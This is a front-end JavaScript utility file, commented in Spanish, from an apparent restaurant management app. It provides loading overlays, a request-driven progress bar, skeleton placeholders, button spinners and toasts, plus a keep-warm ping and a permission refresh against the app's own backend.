    // Estado del overlay: temporizador de los 400 ms, si está visible y su texto
    // pendiente (puede cambiar ANTES de que el overlay llegue a dibujarse).
    let _ovT = null, _ovVis = false, _ovTxt = "";

    // ⚠ Mas alto que el umbral del overlay (400 ms): este indicador sale SOLO en la
    // barra, sin que nadie lo pida, asi que tiene que ser claramente "esto tarda" y
    // no parpadear en cada cambio de pantalla, que es lo normal y es rapido.
    const UMBRAL_PILL = 700;
    let _pillT = null, _pillEl = null;

    // El indicador flotante. Se crea la primera vez que hace falta: una pagina donde
    // todo responde rapido nunca llega a construirlo.
    function _pillMostrar() {
        if (!_pillEl || !document.body.contains(_pillEl)) {
            _pillEl = document.createElement("div");
            _pillEl.id = "ui-cargando";
            _pillEl.innerHTML = _animHTML("orbit", "cp-mini") + "<span>Cargando…</span>";
            (document.body || document.documentElement).appendChild(_pillEl);
        }
        // Dos cuadros: sin esto el navegador aplica opacidad y transicion a la vez y
        // el elemento aparece de golpe, sin el fundido.
        requestAnimationFrame(() => requestAnimationFrame(() => {
            if (_pillEl) _pillEl.classList.add("ui-ver");
        }));
    }
    function _pillOcultar() {
        if (_pillEl) _pillEl.classList.remove("ui-ver");
    }

    // Barra de progreso ligada al contador de requests en vuelo.
    let _pending = 0, _bar = null, _trickle = null, _prog = 0;
    function _ensureBar() {
        if (_bar && document.body.contains(_bar)) return _bar;
        _bar = document.getElementById("ui-progress") || document.createElement("div");
        _bar.id = "ui-progress";
        if (!_bar.parentNode) (document.body || document.documentElement).appendChild(_bar);
        return _bar;
    }
    function _set(p) { _prog = p; _ensureBar().style.width = p + "%"; }

    window.UI = {
        // Hooks que apiFetch llama en cada request (no usar directamente).
        _reqStart() {
            _pending++;
            if (_pending === 1) {
                _ensureBar().style.opacity = "1";
                _set(8);
                clearInterval(_trickle);
                _trickle = setInterval(() => { if (_prog < 90) _set(_prog + (90 - _prog) * 0.12); }, 300);
                clearTimeout(_pillT);
                _pillT = setTimeout(_pillMostrar, UMBRAL_PILL);
            }
        },
        _reqEnd() {
            _pending = Math.max(0, _pending - 1);
            if (_pending === 0) {
                clearInterval(_trickle);
                clearTimeout(_pillT); _pillT = null;
                _pillOcultar();
                _set(100);
                const b = _ensureBar();
                setTimeout(() => { b.style.opacity = "0"; setTimeout(() => _set(0), 300); }, 220);
            }
        },
        // Rellena un <tbody> con filas "shimmer" mientras carga la tabla.
        // SOLO en la primera carga: en un REFRESCO (ya hay filas de datos) se deja el
        // contenido viejo hasta que llegue el nuevo — reemplazarlo por el esqueleto
        // acortaba la página, el scroll se clampaba al tope y tras cada edición había
        // que volver a bajar hasta donde se estaba.
        skeleton(tbody, rows = 6, cols = 4) {
            if (!tbody) return;
            if (tbody.children.length > 1 && !tbody.querySelector(".ui-skel")) return;
            let html = "";
            for (let r = 0; r < rows; r++) {
                let tds = "";
                for (let c = 0; c < cols; c++) {
                    tds += `<td><span class="ui-skel" style="width:${40 + ((r * 7 + c * 13) % 50)}%"></span></td>`;
                }
                html += `<tr>${tds}</tr>`;
            }
            tbody.innerHTML = html;
        },
        // Tarjetas grises (para grids de stats/dashboard). Misma regla: solo 1ª carga.
        skeletonCards(cont, n = 4) {
            if (!cont) return;
            if (cont.children.length > 1 && !cont.querySelector(".ui-skel-card")) return;
            cont.innerHTML = Array.from({ length: n }, () => `<div class="ui-skel-card"></div>`).join("");
        },
        // Devuelve el HTML de una animación de marca, para incrustar donde haga falta.
        // tipo: orbit (default) | pulse | scan | prog | beat
        // extra: clases sueltas, p.ej. "cp-mini" para incrustarlo en un botón.
        marca(tipo = "orbit", extra = "") { return _animHTML(tipo, extra); },
        // Mueve el anillo determinado (0-100). Sin elemento, mueve el del overlay.
        progreso(pct, el) {
            const r = el || document.querySelector("#ui-overlay .cp-prog");
            if (r) r.style.setProperty("--cp-pct", Math.max(0, Math.min(100, pct)));
        },
        // Overlay bloqueante con animación + texto (cobrar/guardar/importar/IA).
        // tipo elige QUÉ espera es: "scan" para la IA, "prog" para subidas con
        // porcentaje, "pulse" para esperas sin final conocido, "orbit" para el resto.
        // ⚠ No se muestra antes de 400 ms: si la respuesta llega antes, aparecer y
        // desaparecer se ve como un parpadeo y se siente PEOR que no poner nada. Si lo
        // apagan antes de ese umbral, nunca llega a dibujarse.
        overlay(show, texto = "Procesando…", tipo = "orbit") {
            if (!show) {
                clearTimeout(_ovT); _ovT = null; _ovVis = false;
                const ov = document.getElementById("ui-overlay");
                if (ov) ov.style.display = "none";
                return;
            }
            _ovTxt = texto;
            const pintar = () => {
                let ov = document.getElementById("ui-overlay");
                if (!ov) {
                    ov = document.createElement("div");
                    ov.id = "ui-overlay"; ov.className = "ui-overlay";
                    ov.innerHTML = `<div class="ui-overlay-box"><div id="ui-overlay-anim"></div><div id="ui-overlay-txt"></div></div>`;
                    document.body.appendChild(ov);
                }
                const an = ov.querySelector("#ui-overlay-anim");
                // Sólo se reescribe si cambió el tipo: reasignar innerHTML reinicia la
                // animación desde cero y se ve un salto en cada cambio de texto.
                if (an && an.dataset.tipo !== tipo) { an.dataset.tipo = tipo; an.innerHTML = _animHTML(tipo); }
                ov.querySelector("#ui-overlay-txt").textContent = _ovTxt;
                ov.style.display = "flex";
            };
            if (_ovVis) { pintar(); return; }       // ya visible: refresca texto/tipo al vuelo
            if (_ovT) return;                       // ya agendado: no encimar temporizadores
            _ovT = setTimeout(() => { _ovVis = true; pintar(); }, 400);
        },
        // Cambia el texto del overlay ya abierto (p.ej. contador de segundos).
        // Si todavía está dentro de los 400 ms, se guarda para cuando se dibuje.
        overlayText(texto) {
            _ovTxt = texto;
            const el = document.getElementById("ui-overlay-txt");
            if (el) el.textContent = texto;
        },
        // Deshabilita un botón + spinner inline mientras dura una acción; lo restaura al apagar.
        busy(btn, on, texto) {
            if (!btn) return;
            if (on) {
                if (btn.dataset.uiBusy) return;
                btn.dataset.uiBusy = "1";
                btn.dataset.uiHtml = btn.innerHTML;
                btn.disabled = true;
                btn.innerHTML = `<span class="ui-spinner"></span>${texto ? " " + texto : ""}`;
            } else {
                if (!btn.dataset.uiBusy) return;
                btn.innerHTML = btn.dataset.uiHtml || "";
                btn.disabled = false;
                delete btn.dataset.uiBusy;
                delete btn.dataset.uiHtml;
            }
        },
        // Notificación transitoria arriba a la derecha (auto-cierra). tipo: info|success|error
        toast(msg, tipo = "info", ms = 3500) {
            let wrap = document.getElementById("ui-toast-wrap");
            if (!wrap) {
                wrap = document.createElement("div");
                wrap.id = "ui-toast-wrap"; wrap.className = "ui-toast-wrap";
                document.body.appendChild(wrap);
            }
            const t = document.createElement("div");
            t.className = "ui-toast ui-toast-" + tipo;
            t.textContent = msg;
            wrap.appendChild(t);
            requestAnimationFrame(() => t.classList.add("show"));
            setTimeout(() => {
                t.classList.remove("show");
                setTimeout(() => t.remove(), 300);
            }, ms);
        },
    };

    // ── Keep-warm ─────────────────────────────────────────────
    // Mientras la página está abierta y hay sesión, ping liviano a la raíz (sin DB)
    // cada ~3.5 min para que Railway no "duerma" el server y la próxima acción no
    // pague el cold-start. No usa apiFetch → no mueve la barra de progreso.
    setInterval(() => {
        if (!getToken()) return;
        fetch(`${API_URL}/`, { method: "GET", cache: "no-store" }).catch(() => {});
    }, 210000);

    // ── Refresh de permisos ───────────────────────────────────
    // Los permisos viven en localStorage desde el LOGIN: si el admin edita el
    // rol después, la sesión no se enteraba hasta re-loguear (los gates de las
    // páginas leían un snapshot viejo). Al cargar cada página se refresca el
    // usuario desde /auth/me (que ahora devuelve el set completo de flags) y
    // los cambios de permisos aplican en la próxima navegación, sin re-login.
    // Solo para usuarios de restaurante (las cuentas de cadena/superadmin usan
    // tokens sintéticos con otro shape).
    (async () => {
        const u = getUser();
        if (!getToken() || !u || ["empleado_cadena", "gerente_cadena", "superadmin"].includes(u.rol)) return;
        try {
            const me = await apiFetch("/auth/me", { silent: true });
            if (me && me.username === u.username) {
                // Merge: conserva campos que /me no devuelve (modulos, pantalla_default).
                setUser({ ...u, ...me });
            }
        } catch (_) { /* silencioso: sin red o token vencido (el 401 ya desloguea) */ }
    })();
})();